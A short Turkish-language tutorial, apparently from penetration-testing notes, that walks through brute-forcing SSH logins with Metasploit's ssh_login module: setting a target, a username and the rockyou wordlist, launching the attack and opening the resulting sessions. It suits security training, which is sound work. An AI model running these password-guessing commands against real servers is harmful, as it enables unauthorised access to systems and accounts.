Metasploit Framework, SSH servisinde kaba kuvvet saldırısı için hazır bir modül barındırır.  

---

## 🔍 Modül Arama
```bash
search ssh
```
- Birçok SSH modülü listelenir.  
- Bizim için uygun olan:  
```bash
use auxiliary/scanner/ssh/ssh_login
```

---

## ⚙️ Modül Konfigürasyonu
Mevcut seçenekleri görmek için:  
```bash
show options
```

**Önemli parametreler:**
- `RHOSTS` → Hedef IP  
- `USERNAME` → Belirli bir kullanıcı adı  
- `USER_FILE` → Kullanıcı adı wordlisti  
- `PASSWORD` → Belirli parola  
- `PASS_FILE` → Parola wordlisti  
- `VERBOSE` → Denemelerin görünürlüğü  

**Örnek ayarlar:**
```bash
set RHOSTS <hedef ip>
set VERBOSE true
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

---

## 🚀 Saldırıyı Başlatmak
```bash
exploit
```

- Araç, wordlist’teki parolaları tek tek dener.  
- Eğer doğru kombinasyon bulunursa oturum açılır.  

---

## 📂 Başarılı Sonuçlar
- Aktif sessionları listelemek:  
```bash
sessions -l
```

- Belirli bir session’a bağlanmak:  
```bash
sessions 1
```

✅ Artık hedef makineye SSH üzerinden erişim sağlanmıştır.  
